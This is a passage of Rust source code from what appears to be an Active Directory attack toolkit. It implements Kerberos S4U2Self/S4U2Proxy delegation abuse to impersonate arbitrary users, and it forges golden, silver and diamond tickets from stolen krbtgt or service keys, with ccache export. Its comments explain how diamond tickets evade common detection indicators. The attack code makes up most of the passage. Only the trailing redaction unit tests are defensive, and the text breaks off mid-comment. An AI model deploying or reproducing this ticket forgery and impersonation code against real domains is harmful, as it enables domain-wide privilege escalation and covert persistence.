        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        crealm: ExplicitContextTag1::from(krb_string(&st.crealm)?),
        cname: ExplicitContextTag2::from(st.cname.clone()),
        cksum: Optional::from(Some(ExplicitContextTag3::from(Checksum {
            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80, 0x03])), // 0x8003
            checksum: ExplicitContextTag1::from(OctetStringAsn1(gss_cksum)),
        }))),
        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
        ctime: ExplicitContextTag5::from(now_kerberos_time()),
        subkey: Optional::from(Some(ExplicitContextTag6::from(EncryptionKey {
            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![17])), // AES128
            key_value: ExplicitContextTag1::from(OctetStringAsn1(subkey.to_vec())),
        }))),
        seq_number: Optional::from(None),
        authorization_data: Optional::from(None),
    });
    let auth_der =
        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
    // Authenticator sealed under the *ticket session key* (usage 11) — RC4 or AES per its etype.
    let enc_auth = enc_session(&st.session_key, 11, &auth_der)?;

    let ap_req = ApReq::from(ApReqInner {
        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
        // ap-options: bit 1 (0x40000000) = mutual-required OFF; send 0 so the session key stays
        // our subkey (no acceptor subkey in an AP-REP).
        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0, 0, 0, 0,
        ]))),
        ticket: ExplicitContextTag3::from(st.ticket.clone()),
        authenticator: ExplicitContextTag4::from(encrypted_data(
            session_etype(&st.session_key),
            enc_auth,
        )),
    });
    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
    Ok((crate::gss::spnego_krb5_init(&ap_der), subkey))
}

/// AES256 variant of [`build_ap_req_gss`] — generates a 32-byte AES256 subkey (etype 18)
/// and returns the RAW GSS-Kerberos token (not SPNEGO-wrapped) plus the subkey.
///
/// Windows DCE-RPC BIND with `auth_type = RPC_C_AUTHN_GSS_KERBEROS (0x10)` requires the
/// raw form; SPNEGO wrapping there trips a BIND_NAK. If a caller instead needs the
/// SPNEGO-wrapped form (e.g. `RPC_C_AUTHN_GSS_NEGOTIATE (0x09)` or SMB SESSION_SETUP),
/// wrap the returned raw bytes via `crate::gss::spnego_krb5_init(ap_req_der)` — passing
/// the raw AP-REQ DER, not this function's output.
pub fn build_ap_req_gss_aes256(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 32])> {
    let mut subkey = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut subkey);

    // Same GSS 0x8003 checksum as the AES128 path — only the subkey etype/size changes.
    let mut gss_cksum = Vec::new();
    gss_cksum.extend_from_slice(&16u32.to_le_bytes());
    gss_cksum.extend_from_slice(&[0u8; 16]);
    gss_cksum.extend_from_slice(&0x0000_003cu32.to_le_bytes());

    let authenticator = Authenticator::from(AuthenticatorInner {
        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        crealm: ExplicitContextTag1::from(krb_string(&st.crealm)?),
        cname: ExplicitContextTag2::from(st.cname.clone()),
        cksum: Optional::from(Some(ExplicitContextTag3::from(Checksum {
            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80, 0x03])),
            checksum: ExplicitContextTag1::from(OctetStringAsn1(gss_cksum)),
        }))),
        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
        ctime: ExplicitContextTag5::from(now_kerberos_time()),
        subkey: Optional::from(Some(ExplicitContextTag6::from(EncryptionKey {
            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![18])), // AES256
            key_value: ExplicitContextTag1::from(OctetStringAsn1(subkey.to_vec())),
        }))),
        seq_number: Optional::from(None),
        authorization_data: Optional::from(None),
    });
    let auth_der =
        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
    // Ticket-session-key encrypts the authenticator (usage 11). session_etype picks the
    // right cipher for the ticket key size — matches how build_ap_req_gss does it.
    let enc_auth = enc_session(&st.session_key, 11, &auth_der)?;

    let ap_req = ApReq::from(ApReqInner {
        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0, 0, 0, 0,
        ]))),
        ticket: ExplicitContextTag3::from(st.ticket.clone()),
        authenticator: ExplicitContextTag4::from(encrypted_data(
            session_etype(&st.session_key),
            enc_auth,
        )),
    });
    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
    Ok((crate::gss::gss_krb5_aprep(&ap_der), subkey))
}

// ---------------------------------------------------------------------------
// S4U (MS-SFU): S4U2Self + S4U2Proxy — the RBCD / constrained-delegation abuse.
// ---------------------------------------------------------------------------

const PA_TGS_REQ: u8 = 0x01;
const KERB_NON_KERB_CKSUM_SALT: i32 = 17;

/// PA-FOR-USER (MS-SFU §2.2.1): identifies the user to impersonate, keyed to the TGT.
#[derive(Serialize)]
struct PaForUser {
    user_name: ExplicitContextTag0<PrincipalName>,
    user_realm: ExplicitContextTag1<GeneralStringAsn1>,
    cksum: ExplicitContextTag2<Checksum>,
    auth_package: ExplicitContextTag3<GeneralStringAsn1>,
}

/// Human-readable KDC error from a response that failed to parse as the expected reply.
fn krb_err(resp: &[u8]) -> String {
    match picky_asn1_der::from_bytes::<KrbError>(resp) {
        Ok(err) => format!("KDC error {}", err.0.error_code.0),
        Err(e) => format!("decode: {e}"),
    }
}

/// The AP-REQ (authenticator under the TGT session key) wrapped as PA-TGS-REQ — the
/// authentication padata every TGS-REQ carries.
fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
    let authenticator = Authenticator::from(AuthenticatorInner {
        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
        cname: ExplicitContextTag2::from(tgt.cname.clone()),
        cksum: Optional::from(None),
        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
        ctime: ExplicitContextTag5::from(now_kerberos_time()),
        subkey: Optional::from(None),
        seq_number: Optional::from(None),
        authorization_data: Optional::from(None),
    });
    let auth_der =
        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
    let enc_auth = enc_session(
        &tgt.session_key,
        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
        &auth_der,
    )?;
    let ap_req = ApReq::from(ApReqInner {
        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0, 0, 0, 0,
        ]))),
        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
        authenticator: ExplicitContextTag4::from(encrypted_data(
            session_etype(&tgt.session_key),
            enc_auth,
        )),
    });
    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
    Ok(PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![PA_TGS_REQ])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
    })
}

/// Assemble a TGS-REQ with the given sname, padata, kdc-options and additional tickets.
fn build_tgs_req(
    realm: &str,
    sname: PrincipalName,
    padatas: Vec<PaData>,
    options: [u8; 4],
    additional: Vec<picky_krb::data_types::Ticket>,
    etypes: &[u8],
) -> Result<picky_krb::messages::TgsReq> {
    let add = if additional.is_empty() {
        Optional::from(None)
    } else {
        Optional::from(Some(ExplicitContextTag11::from(Asn1SequenceOf::from(
            additional,
        ))))
    };
    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(
            options.to_vec(),
        ))),
        cname: Optional::from(None),
        realm: ExplicitContextTag2::from(krb_string(realm)?),
        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(crate::far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(
            etypes
                .iter()
                .map(|e| IntegerAsn1(vec![*e]))
                .collect::<Vec<_>>(),
        )),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: add,
    };
    Ok(TgsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(
            padatas,
        )))),
        req_body: ExplicitContextTag4::from(body),
    }))
}

fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<PaData> {
    // The PA-FOR-USER checksum (cksumtype 16) is HMAC-SHA1-96-AES256, so it is only valid over a
    // 32-byte AES256 TGT session key. An RC4 (16-byte) session key would need cksumtype -138
    // (HMAC-MD5) instead — fail loudly rather than send a checksum the KDC will silently reject.
    // In practice get_tgt() always yields AES256 (or bails on ETYPE_NOSUPP), so this only guards a
    // future RC4/NT-hash-driven caller: RBCD needs a controlled account that has an AES key.
    if tgt.session_key.len() != 32 {
        bail!(
            "S4U2Self (PA-FOR-USER) needs an AES256 TGT session key, got {} bytes — RBCD/constrained \
             delegation requires a controlled account with an AES key (password- or machine-account \
             based), not an RC4-only/NT-hash TGT",
            tgt.session_key.len()
        );
    }
    // S4U checksum input: LE(name-type) || username || realm || auth-package.
    let mut s4u = Vec::new();
    s4u.extend_from_slice(&(NT_PRINCIPAL as i32).to_le_bytes());
    s4u.extend_from_slice(impersonate.as_bytes());
    s4u.extend_from_slice(tgt.crealm.as_bytes());
    s4u.extend_from_slice(b"Kerberos");
    let cksum = ChecksumSuite::HmacSha196Aes256
        .hasher()
        .checksum(&tgt.session_key, KERB_NON_KERB_CKSUM_SALT, &s4u)
        .map_err(|e| anyhow!("PA-FOR-USER checksum: {e}"))?;

    let pfu = PaForUser {
        user_name: ExplicitContextTag0::from(principal(NT_PRINCIPAL, &[impersonate])?),
        user_realm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
        cksum: ExplicitContextTag2::from(Checksum {
            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![16])), // HMAC-SHA1-96-AES256
            checksum: ExplicitContextTag1::from(OctetStringAsn1(cksum)),
        }),
        auth_package: ExplicitContextTag3::from(krb_string("Kerberos")?),
    };
    Ok(PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0x81])), // PA-FOR-USER = 129
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&pfu).map_err(|e| anyhow!("PA-FOR-USER encode: {e}"))?,
        )),
    })
}

/// S4U2Self: obtain a service ticket to our own account *as* `impersonate`.
pub async fn s4u2self(
    tgt: &Tgt,
    self_sam: &str,
    impersonate: &str,
    kdc: &str,
) -> Result<picky_krb::data_types::Ticket> {
    let req = build_tgs_req(
        &tgt.crealm,
        principal(NT_PRINCIPAL, &[self_sam])?,
        vec![ap_req_padata(tgt)?, pa_for_user(tgt, impersonate)?],
        [0x40, 0x01, 0x00, 0x00], // forwardable | canonicalize
        vec![],
        &[crate::ETYPE_AES256],
    )?;
    let resp = kdc_exchange(
        kdc,
        &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Self encode: {e}"))?,
    )
    .await?;
    let rep: TgsRep = picky_asn1_der::from_bytes(&resp)
        .map_err(|_| anyhow!("S4U2Self failed: {}", krb_err(&resp)))?;
    Ok(rep.0.ticket.0.clone())
}

/// PA-PAC-OPTIONS advertising Resource-Based Constrained Delegation (bit 3) — required so
/// the KDC uses the RBCD path in S4U2Proxy instead of classic KCD (else KDC_ERR_BADOPTION).
fn pa_pac_options_rbcd() -> Result<PaData> {
    let opts = PaPacOptions {
        flags: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0x10, 0, 0, 0,
        ]))),
    };
    Ok(PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0xa7])), // PA-PAC-OPTIONS = 167
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&opts).map_err(|e| anyhow!("PA-PAC-OPTIONS encode: {e}"))?,
        )),
    })
}

/// S4U2Proxy: use the S4U2Self ticket as an additional ticket to get a service ticket to
/// `target_spn` as the impersonated user (the RBCD payoff).
pub async fn s4u2proxy(
    tgt: &Tgt,
    self_ticket: picky_krb::data_types::Ticket,
    target_spn: &str,
    kdc: &str,
) -> Result<picky_krb::data_types::Ticket> {
    let parts: Vec<&str> = target_spn.split('/').collect();
    let req = build_tgs_req(
        &tgt.crealm,
        principal(NT_SRV_INST, &parts)?,
        vec![ap_req_padata(tgt)?, pa_pac_options_rbcd()?],
        [0x40, 0x03, 0x00, 0x00], // forwardable | cname-in-addl-tkt | canonicalize
        vec![self_ticket],
        &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
    )?;
    let resp = kdc_exchange(
        kdc,
        &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Proxy encode: {e}"))?,
    )
    .await?;
    let rep: TgsRep = picky_asn1_der::from_bytes(&resp)
        .map_err(|_| anyhow!("S4U2Proxy failed: {}", krb_err(&resp)))?;
    Ok(rep.0.ticket.0.clone())
}

/// Full RBCD chain: TGT for the controlled account → S4U2Self(impersonate) → S4U2Proxy to
/// the target service. Returns the etype of the final impersonation ticket as proof.
pub async fn rbcd_impersonate(
    account: &str,
    password: &str,
    realm: &str,
    kdc: &str,
    impersonate: &str,
    target_spn: &str,
) -> Result<u32> {
    let bare = account.split('@').next().unwrap_or(account);
    let bare = bare.rsplit('\\').next().unwrap_or(bare);
    let tgt = get_tgt(account, password, realm, kdc).await?;
    let self_ticket = s4u2self(&tgt, bare, impersonate, kdc).await?;
    let svc_ticket = s4u2proxy(&tgt, self_ticket, target_spn, kdc).await?;
    let etype = svc_ticket
        .0
        .enc_part
        .0
        .etype
        .0
         .0
        .iter()
        .fold(0u32, |a, &b| (a << 8) | b as u32);
    Ok(etype)
}

/// **1.4.8-A WS-DIAMOND-TICKET**: overrides for a forged ticket's timestamps. `None`
/// on any field falls back to `now_kerberos_time()` / `far_future_time()` (the Golden
/// / Silver default that flags anomalously — 10-year validity is a well-known IOC).
/// A Diamond ticket populates all four from a legitimately-obtained TGT so the
/// forged one's clock-domain matches the KDC exactly.
#[derive(Default, Clone)]
pub struct TicketTimestamps {
    pub auth_time: Option<KerberosTime>,
    pub starttime: Option<KerberosTime>,
    pub endtime: Option<KerberosTime>,
    pub renew_till: Option<KerberosTime>,
}

/// Shared ticket forger. Marshals the PAC (signed with `server_sig_key`/`kdc_sig_key`), wraps it
/// in the EncTicketPart authorization-data, and seals the whole thing under `ticket_key`
/// (key usage 2). `sname` is the ticket's service principal.
fn forge_ticket(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    ticket_key: &[u8],
    server_sig_key: &[u8],
    kdc_sig_key: &[u8],
    sname: &[&str],
    rc4: bool,
) -> Result<Tgt> {
    forge_ticket_with_timestamps(
        id,
        realm,
        ticket_key,
        server_sig_key,
        kdc_sig_key,
        sname,
        rc4,
        &TicketTimestamps::default(),
    )
}

/// Same as [`forge_ticket`], but any populated field of `ts` overrides the
/// now/far-future defaults. Diamond ticket forge uses this to inherit real
/// KDC-issued timestamps from a legit TGT.
///
/// (Kept as an 8-arg fn rather than bundled into a context struct — every arg
/// here is already deliberate and separately controlled by the caller.)
#[allow(clippy::too_many_arguments)]
fn forge_ticket_with_timestamps(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    ticket_key: &[u8],
    server_sig_key: &[u8],
    kdc_sig_key: &[u8],
    sname: &[&str],
    rc4: bool,
    ts: &TicketTimestamps,
) -> Result<Tgt> {
    let realm = realm.to_uppercase();
    let pac_bytes = crate::pac::assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
    let etype = if rc4 {
        ETYPE_RC4_HMAC
    } else {
        crate::ETYPE_AES256
    };

    // authorization-data: AD-IF-RELEVANT(1) → [ AD-WIN2K-PAC(128) = pac ].
    let win2k = AuthorizationDataInner {
        ad_type: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80])), // 128
        ad_data: ExplicitContextTag1::from(OctetStringAsn1(pac_bytes)),
    };
    let inner: AuthorizationData = Asn1SequenceOf::from(vec![win2k]);
    let inner_der = picky_asn1_der::to_vec(&inner).map_err(|e| anyhow!("encode PAC AD: {e}"))?;
    let if_rel = AuthorizationDataInner {
        ad_type: ExplicitContextTag0::from(IntegerAsn1(vec![0x01])),
        ad_data: ExplicitContextTag1::from(OctetStringAsn1(inner_der)),
    };
    let auth: AuthorizationData = Asn1SequenceOf::from(vec![if_rel]);

    // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
    let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
    let cname = principal(NT_PRINCIPAL, &[id.user.as_str()])?;

    // Ticket flags 0x40e10000: forwardable, proxiable, renewable, initial, pre-authent.
    let etp = EncTicketPart {
        flags: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0x40, 0xe1, 0x00, 0x00,
        ]))),
        key: ExplicitContextTag1::from(EncryptionKey {
            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
            key_value: ExplicitContextTag1::from(OctetStringAsn1(sk.clone())),
        }),
        crealm: ExplicitContextTag2::from(krb_string(&realm)?),
        cname: ExplicitContextTag3::from(cname.clone()),
        transited: ExplicitContextTag4::from(TransitedEncoding {
            tr_type: ExplicitContextTag0::from(IntegerAsn1(vec![0])),
            contents: ExplicitContextTag1::from(OctetStringAsn1(vec![])),
        }),
        auth_time: ExplicitContextTag5::from(
            ts.auth_time.clone().unwrap_or_else(now_kerberos_time),
        ),
        starttime: Optional::from(Some(ExplicitContextTag6::from(
            ts.starttime.clone().unwrap_or_else(now_kerberos_time),
        ))),
        endtime: ExplicitContextTag7::from(
            ts.endtime.clone().unwrap_or_else(crate::far_future_time),
        ),
        renew_till: Optional::from(Some(ExplicitContextTag8::from(
            ts.renew_till.clone().unwrap_or_else(crate::far_future_time),
        ))),
        caddr: Optional::from(None),
        authorization_data: Optional::from(Some(ExplicitContextTag10::from(auth))),
    };
    let etp_app: ApplicationTag<EncTicketPart, 3> = ApplicationTag(etp);
    let etp_der =
        picky_asn1_der::to_vec(&etp_app).map_err(|e| anyhow!("encode EncTicketPart: {e}"))?;
    // key usage 2 = ticket enc-part.
    let enc = if rc4 {
        crate::rc4::encrypt(ticket_key, 2, &etp_der, None)
    } else {
        aes256()
            .encrypt(ticket_key, 2, &etp_der)
            .map_err(|e| anyhow!("encrypt EncTicketPart: {e}"))?
    };

    let ticket = Ticket::from(TicketInner {
        tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        realm: ExplicitContextTag1::from(krb_string(&realm)?),
        sname: ExplicitContextTag2::from(principal(NT_SRV_INST, sname)?),
        enc_part: ExplicitContextTag3::from(encrypted_data(etype, enc)),
    });

    Ok(Tgt {
        ticket,
        session_key: sk,
        cname,
        crealm: realm,
    })
}

/// Forge a golden ticket: a TGT for an arbitrary identity, its EncTicketPart (with a forged PAC)
/// sealed under the domain's krbtgt AES256 key. The PAC's server *and* KDC signatures are both
/// computed with the krbtgt key, so a fully-patched (KB5020805) KDC accepts it. Returns a usable
/// [`Tgt`]; feed it to [`roast_spn`] for a live acceptance proof or [`golden_ccache`] to persist.
pub fn forge_golden_tgt(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    krbtgt_key: &[u8],
    rc4: bool,
) -> Result<Tgt> {
    let realm_up = realm.to_uppercase();
    forge_ticket(
        id,
        realm,
        krbtgt_key,
        krbtgt_key,
        krbtgt_key,
        &["krbtgt", &realm_up],
        rc4,
    )
}

/// **1.4.8-A WS-DIAMOND-TICKET**: forge a **Diamond ticket** — a TGT with an
/// attacker-chosen PAC (`id_overrides`) but timestamps + `cname` inherited from a
/// legitimately-obtained real TGT (`real`). The outer TGT looks like a normal
/// KDC-issued ticket (real auth/start/end/renew times matching wall-clock, real
/// principal), only the PAC's group memberships / SIDs are attacker-controlled.
///
/// Threat-hunting properties vs Golden:
/// - Golden: 10-year `endtime` + `renew_till` is a common Elastic / Sigma IOC.
/// - Diamond: timestamps match the KDC's real clock domain. Detection has to
///   go through the PAC's KDC signature or logon-event correlation — one
///   defense layer deeper.
///
/// Requires:
/// - `real`: a legitimately-obtained TGT (`get_tgt` / `asktgt` under any account).
/// - `krbtgt_key`: the domain's krbtgt AES256 key (from a prior DCSync).
/// - `id_overrides`: attacker-chosen PAC.
///
/// Feed the returned `Tgt` to [`golden_ccache`] to persist as an MIT ccache.
pub fn forge_diamond_tgt(
    real: &Tgt,
    id_overrides: &crate::pac::ForgeIdentity,
    krbtgt_key: &[u8],
    rc4: bool,
) -> Result<Tgt> {
    let (etp, _pac_bytes) = crate::pac::decrypt_ticket_pac(real, krbtgt_key)
        .context("decrypt real TGT ticket with krbtgt key")?;
    let ts = TicketTimestamps {
        auth_time: Some(etp.auth_time.0.clone()),
        starttime: etp.starttime.0.as_ref().map(|s| s.0.clone()),
        endtime: Some(etp.endtime.0.clone()),
        renew_till: etp.renew_till.0.as_ref().map(|s| s.0.clone()),
    };
    let realm_up = real.crealm.to_uppercase();
    forge_ticket_with_timestamps(
        id_overrides,
        &real.crealm,
        krbtgt_key,
        krbtgt_key,
        krbtgt_key,
        &["krbtgt", &realm_up],
        rc4,
        &ts,
    )
}

/// Forge a silver ticket: a service ticket (TGS) for `spn`, sealed + PAC-signed under the target
/// **service account's** AES256 key (from `dcsync <machine$/svc>`). Used directly against the
/// service (AP-REQ) without contacting the KDC — so the KDC signature is unchecked; both PAC
/// signatures use the service key. Returns the forged service ticket as a [`Tgt`] wrapper
/// (`.ticket`/session key); persist with [`silver_ccache`].
pub fn forge_silver_tgt(
    id: &crate::pac::ForgeIdentity,
    realm: &str,
    service_key: &[u8],
    spn: &str,
    rc4: bool,
) -> Result<Tgt> {
    let comps: Vec<&str> = spn.split('/').collect();
    forge_ticket(
        id,
        realm,
        service_key,
        service_key,
        service_key,
        &comps,
        rc4,
    )
}

/// Serialize a forged [`Tgt`] to an MIT credential cache (usable with `KRB5CCNAME` / `-k` tools).
pub fn golden_ccache(tgt: &Tgt, user: &str) -> Result<Vec<u8>> {
    ccache_for(tgt, user, &["krbtgt", &tgt.crealm.clone()])
}

/// Serialize a forged silver ticket to a ccache (server principal = the SPN).
pub fn silver_ccache(tgt: &Tgt, user: &str, spn: &str) -> Result<Vec<u8>> {
    let comps: Vec<&str> = spn.split('/').collect();
    ccache_for(tgt, user, &comps)
}

fn ccache_for(tgt: &Tgt, user: &str, server: &[&str]) -> Result<Vec<u8>> {
    use crate::pkinit::{cvec, write_principal};
    let realm = &tgt.crealm;
    let mut c = Vec::new();
    c.extend_from_slice(&[0x05, 0x04]); // version 0x0504
    let header = [0x00u8, 0x01, 0x00, 0x08, 0, 0, 0, 0, 0, 0, 0, 0];
    c.extend_from_slice(&(header.len() as u16).to_be_bytes());
    c.extend_from_slice(&header);

    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // default principal
    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // client
    write_principal(&mut c, NT_SRV_INST as u32, realm, server); // server

    // keyblock: keytype (RC4=23 or AES256=18 per the session key), etype(0), keylen, key
    c.extend_from_slice(&(session_etype(&tgt.session_key) as u16).to_be_bytes());
    c.extend_from_slice(&0u16.to_be_bytes());
    c.extend_from_slice(&(tgt.session_key.len() as u16).to_be_bytes());
    c.extend_from_slice(&tgt.session_key);

    // times: authtime, starttime, endtime, renew_till — 0/now-ish is fine for a forged cred.
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as u32)
        .unwrap_or(0);
    let far = now.saturating_add(10 * 365 * 24 * 3600);
    for t in [now, now, far, far] {
        c.extend_from_slice(&t.to_be_bytes());
    }
    c.push(0); // is_skey = false
    c.extend_from_slice(&0x50e10000u32.to_be_bytes()); // tktflags (forwardable|renewable|initial|preauth)
    c.extend_from_slice(&0u32.to_be_bytes()); // num_address
    c.extend_from_slice(&0u32.to_be_bytes()); // num_authdata

    let ticket_der =
        picky_asn1_der::to_vec(&tgt.ticket).map_err(|e| anyhow!("encode ticket: {e}"))?;
    cvec(&mut c, &ticket_der);
    cvec(&mut c, &[]); // empty second ticket
    Ok(c)
}

// WS-REDACT-TICKET (1.4.7): defensive Debug impls on Tgt + ServiceTicket redact the session
// key + ticket ciphertext. `PkinitTgt` already wraps its secrets in `Redacted<T>` — this
// closes the same gap on the non-PKINIT ticket types so the WS-INT-VVV auto-trace can't
// leak session-key bytes if a future refactor embeds a Tgt in a `#[derive(Debug)]` struct.
#[cfg(test)]
mod ws_redact_ticket_tests {
    use super::{
        encrypted_data, krb_string, principal, PrincipalName, ServiceTicket, Tgt, Ticket,
        TicketInner, NT_SRV_INST,
    };
    use picky_asn1::wrapper::{
        ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2, ExplicitContextTag3,
        IntegerAsn1,
    };

    /// Build a stand-in Ticket + Tgt/ServiceTicket for redaction testing. The session_key
    /// carries a distinctive sentinel byte pattern so we can assert it never surfaces in
    /// `{:?}` output.
    fn sentinel_ticket() -> Ticket {
        Ticket::from(TicketInner {
            tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
            realm: ExplicitContextTag1::from(krb_string("TESTLAB.LOCAL").unwrap()),
            sname: ExplicitContextTag2::from(
                principal(NT_SRV_INST, &["krbtgt", "TESTLAB.LOCAL"]).unwrap(),
            ),
            // ticket ciphertext carries a distinctive sentinel pattern the test also checks for.
            enc_part: ExplicitContextTag3::from(encrypted_data(
                18,
                b"CIPHERSENTINEL_MUST_NOT_LEAK".to_vec(),
            )),
        })
    }

    fn sentinel_cname() -> PrincipalName {
        principal(1 /* NT_PRINCIPAL */, &["alice"]).unwrap()
    }

    /// The session-key sentinel: distinctive 32 bytes we can grep the format output for.
    const SESSION_KEY_SENTINEL: &[u8] = b"SESSIONKEY_SENTINEL_MUST_NOT_LEAK";

    #[test]
    fn tgt_debug_redacts_session_key_and_ticket() {
        let tgt = Tgt {
            ticket: sentinel_ticket(),
            session_key: SESSION_KEY_SENTINEL.to_vec(),
            cname: sentinel_cname(),
            crealm: "TESTLAB.LOCAL".to_string(),
        };
        let dbg = format!("{tgt:?}");
        // Non-secret fields survive (readability).
        assert!(
            dbg.contains("TESTLAB.LOCAL"),
            "crealm should appear, got: {dbg}"
        );
        // Secret bytes must NOT appear — under WS-INT-VVV, interactive sessions run at
        // trace level, and a stray `{tgt:?}` anywhere upstream would otherwise leak these.
        assert!(
            !dbg.contains("SESSIONKEY_SENTINEL_MUST_NOT_LEAK"),
            "session_key bytes must be redacted, got: {dbg}"
        );
        assert!(
            !dbg.contains("CIPHERSENTINEL_MUST_NOT_LEAK"),
            "ticket ciphertext must be redacted, got: {dbg}"
        );
        // Positive assertion: the redaction placeholder is present.
        assert!(
            dbg.contains("\"***\""),
            "Debug output must show redaction placeholder, got: {dbg}"
        );
    }

    #[test]
    fn service_ticket_debug_redacts_session_key_and_ticket() {
        let st = ServiceTicket {
            ticket: sentinel_ticket(),
            session_key: SESSION_KEY_SENTINEL.to_vec(),
            crealm: "TESTLAB.LOCAL".to_string(),
            cname: sentinel_cname(),
            spn: vec!["HTTP".to_string(), "webapp01".to_string()],
        };
        let dbg = format!("{st:?}");
        assert!(dbg.contains("TESTLAB.LOCAL"));
        assert!(
            dbg.contains("HTTP"),
            "SPN parts should appear (non-secret): {dbg}"
        );
        assert!(
            !dbg.contains("SESSIONKEY_SENTINEL_MUST_NOT_LEAK"),
            "session_key bytes must be redacted, got: {dbg}"
        );
        assert!(
            !dbg.contains("CIPHERSENTINEL_MUST_NOT_LEAK"),
            "ticket ciphertext must be redacted, got: {dbg}"
        );
        assert!(dbg.contains("\"***\""));
    }

    #[test]
    fn tgt_embedded_in_derived_debug_struct_stays_redacted() {
        // The realistic failure mode WS-INT-VVV creates: someone puts a Tgt in a struct that
        // #[derive(Debug)]s. Verify the redaction still holds via the standard #[derive] path.
        #[derive(Debug)]
        #[allow(dead_code)]
        struct SomeContext {
            note: &'static str,
            tgt: Tgt,
        }
        let ctx = SomeContext {
            note: "carrying a tgt around",
            tgt: Tgt {
                ticket: sentinel_ticket(),
                session_key: SESSION_KEY_SENTINEL.to_vec(),
                cname: sentinel_cname(),
                crealm: "TESTLAB.LOCAL".to_string(),
            },
        };
        let dbg = format!("{ctx:?}");
        assert!(dbg.contains("carrying a tgt around"));
        assert!(
            !dbg.contains("SESSIONKEY_SENTINEL_MUST_NOT_LEAK"),
            "embedding a Tgt in a #[derive(Debug)] struct must not leak secrets, got: {dbg}"
        );
    }
}

#[cfg(test)]
mod aes_key_tests {
    use picky_krb::crypto::CipherSuite;

    /// Regression anchor for the AES256 string-to-key that DCSync-extracted Kerberos keys are
    /// cross-checked against (the same `aes256-cts-hmac-sha1-96` derivation used to authenticate,
    /// which the live integration tests prove correct against a real KDC). Here we pin its output
